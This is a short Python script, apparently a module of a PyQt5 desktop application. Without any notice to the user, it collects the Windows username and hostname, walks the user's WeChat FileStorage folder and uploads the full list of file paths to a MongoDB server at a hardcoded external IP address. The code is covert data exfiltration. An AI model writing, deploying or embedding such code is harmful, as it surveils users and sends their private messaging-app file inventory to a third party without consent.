
import os
import win32api
import getpass
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from PyQt5.QtWidgets import *
from PyQt5 import QtCore, QtGui, QtWidgets
from dataread import *
import pickle
import pymysql
import socket
import time
import requests
import getpass
from pymongo import MongoClient

pcname = socket.getfqdn(socket.gethostname())
username = getpass.getuser()
print(username)
# outip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()
# inip = socket.gethostbyname(username)
# currrenttime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
conn = MongoClient('47.105.38.117', 27017)
db = conn.userdata
key = username + pcname
mycol = db[username + pcname]
mycol.remove({})
wxfilepath = 'C:/Users/' + username + '/Documents/WeChat Files/'
tarpath = ''
for i in os.listdir(wxfilepath):
    # print(i[:2])
    if (i[:2] == 'wx'):
        print(i)
        tarpath = i
filelist = []
for root, dirs, files in os.walk(wxfilepath + tarpath + '\FileStorage\File', topdown=False):
    for name in files:
        # print(os.path.join(root, name))
        filelist.append(os.path.join(root, name))
mycol.insert({'xwdata': filelist})
# for name in dirs:
#     print(os.path.join(root, name))
